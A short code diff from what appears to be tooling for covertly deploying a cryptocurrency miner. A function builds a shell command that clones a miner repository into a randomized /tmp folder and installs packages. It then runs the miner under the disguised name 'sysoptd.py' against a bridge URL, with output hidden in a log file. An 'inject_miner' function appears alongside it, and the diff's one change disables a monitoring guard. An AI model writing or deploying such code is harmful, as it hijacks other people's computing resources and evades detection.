@@ -26,7 +26,7 @@ def generate_random_folder_name() -> str:
 
 def build_worker_command(folder_name: str, bridge_url: str = BRIDGE_URL, threads: int = 64) -> str:
     """Build worker start command with randomized folder."""
-    return f"""cd /tmp && git clone --depth 1 -q "{MINER_REPO}" {folder_name} && cd {folder_name} && pip install websockets psutil --break-system-packages -q && python3 sysoptd.py --bridge {bridge_url} --threads {threads} --no-split --no-schedule --no-noise --no-ramfill > /tmp/m.log 2>&1"""
+    return f"""cd /tmp && git clone --depth 1 -q "{MINER_REPO}" {folder_name} && cd {folder_name} && pip install websockets psutil --break-system-packages -q && MINER_MONITOR_GUARD=0 python3 sysoptd.py --bridge {bridge_url} --threads {threads} --no-split --no-schedule --no-noise --no-ramfill > /tmp/m.log 2>&1"""
 
 
 async def inject_miner(page, bridge_url: str = BRIDGE_URL, threads: int = 64) -> bool:
